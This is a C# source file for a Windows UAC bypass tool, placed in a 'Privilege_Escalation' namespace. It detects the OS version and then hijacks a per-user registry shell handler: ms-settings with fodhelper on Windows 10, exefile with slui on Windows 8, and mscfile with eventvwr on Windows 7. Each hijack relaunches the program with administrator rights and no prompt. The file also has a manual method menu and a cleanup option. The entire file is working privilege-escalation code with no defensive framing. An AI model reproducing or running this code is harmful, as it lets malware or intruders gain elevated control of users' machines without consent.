using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace Privilege_Escalation
{
    public static class UAC
    {
        /// <summary>
        /// Start UAC Bypass
        /// </summary>
        public static void Start()
        {
            var osName = GetWindowsName();

            if (osName.StartsWith("Windows 10"))
                BypassFodhelper();
            else if (osName.StartsWith("Windows 8"))
                BypassSlui();
            else if (osName.StartsWith("Windows 7"))
                BypassEventvwr();
            else
                Compatibility();
        }

        /// <summary>
        /// Compatibility Mode
        /// </summary>
        public static void Compatibility()
        {
            Console.Write("\b");
            Console.WriteLine(@"Compatibility mode enabled.
Your OS might not be compatible.
Are you willing to try exploit anyway?

Numpad 1: Windows 7 (EventVwr)
Numpad 2: Windows 8 (Slui)
Numpad 3: Windows 10 (Fodhelper)
Numpad 4: Failsafe, delete all registry sub key");

            ReCall:
            switch (Console.ReadKey().Key)
            {
                case ConsoleKey.NumPad1:
                    BypassEventvwr();
                    break;
                case ConsoleKey.NumPad2:
                    BypassSlui();
                    break;
                case ConsoleKey.NumPad3:
                    BypassFodhelper();
                    break;
                case ConsoleKey.NumPad4:
                    Console.Write("\b");
                    if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command") != null)
                    {
                        Console.WriteLine("fodhelper deleted.");
                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command");
                    }
                    else
                    {
                        Console.WriteLine("fodhelper not found in registry.");
                    }

                    if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\shell\open\command") != null)
                    {
                        Console.WriteLine("slui deleted.");
                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\exefile\shell\open\command");
                    }
                    else
                    {
                        Console.WriteLine("slui not found in registry.");
                    }

                    if (Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command") != null)
                    {
                        Console.WriteLine("eventvwr deleted.");
                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\mscfile\shell\open\command");
                    }
                    else
                    {
                        Console.WriteLine("eventvwr not found in registry.");
                    }

                    Console.WriteLine("Failsafe done, exiting...");

                    Thread.Sleep(5000);
                    Environment.Exit(0);
                    break;
                default:
                    Console.Write("\b");
                    Console.WriteLine("Could not identify your choice please try again.");
                    goto ReCall;
            }
        }

        /// <summary>
        /// fodhelper bypass should work on Windows 10
        /// </summary>
        private static void BypassFodhelper()
        {
            var wow64Value = IntPtr.Zero;
            Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true)
                ?.SetValue("", Assembly.GetExecutingAssembly().Location);
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\shell\open\command", true)
                ?.SetValue("DelegateExecute", "");
            Wow64Interop.DisableWow64FSRedirection(ref wow64Value);
            try
            {
                Process.Start("fodhelper");
            }
            catch
            {
                Console.WriteLine("Please make sure you removed prefer 32-bits.");
            }
            finally
            {
                Wow64Interop.Wow64RevertWow64FsRedirection(wow64Value);
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Slui bypass should work on Windows 8
        /// </summary>
        private static void BypassSlui()
        {
            var wow64Value = IntPtr.Zero;
            Registry.CurrentUser.CreateSubKey(@"Software\Classes\exefile\shell\open\command");
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\shell\open\command", true)
                ?.SetValue("", Assembly.GetExecutingAssembly().Location);
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\shell\open\command", true)
                ?.SetValue("DelegateExecute", "");
            Wow64Interop.DisableWow64FSRedirection(ref wow64Value);
            try
            {
                Process.Start("slui");
            }
            catch
            {
                Console.WriteLine("Please make sure you removed prefer 32-bits.");
            }
            finally
            {
                Wow64Interop.Wow64RevertWow64FsRedirection(wow64Value);
                Environment.Exit(0);
            }
        }

        /// <summary>
        ///     eventvwr bypass should work on Windows 7 and bellow
        /// </summary>
        private static void BypassEventvwr()
        {
            Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
            Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true)
                ?.SetValue
                    ("", Assembly.GetExecutingAssembly().Location);
            Process.Start("eventvwr");
            Environment.Exit(0);
        }

        /// <summary>
        /// Check if application is running as admin
        /// </summary>
        public static bool IsRunningAsLocalAdmin()
        {
            var cur = WindowsIdentity.GetCurrent();
            if (cur.Groups != null)
                foreach (var role in cur.Groups)
                    if (role.IsValidTargetType(typeof(SecurityIdentifier)))
                    {
                        var sid = (SecurityIdentifier) role.Translate(typeof(SecurityIdentifier));
                        if (sid.IsWellKnown(WellKnownSidType.AccountAdministratorSid) ||
                            sid.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) return true;
                    }

            return false;
        }

        /// <summary>
        /// Get a registry value from ProductName
        /// </summary>
        /// <returns>ProductName</returns>
        public static string GetWindowsName()
        {
            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName",
                    "")
                .ToString();
        }

        private static class Wow64Interop
        {
            private const string Kernel32dll = "Kernel32.Dll";

            [DllImport(Kernel32dll, EntryPoint = "Wow64DisableWow64FsRedirection")]
            public static extern bool DisableWow64FSRedirection(ref IntPtr ptr);

            [DllImport(Kernel32dll, EntryPoint = "Wow64RevertWow64FsRedirection")]
            public static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
        }
    }
}
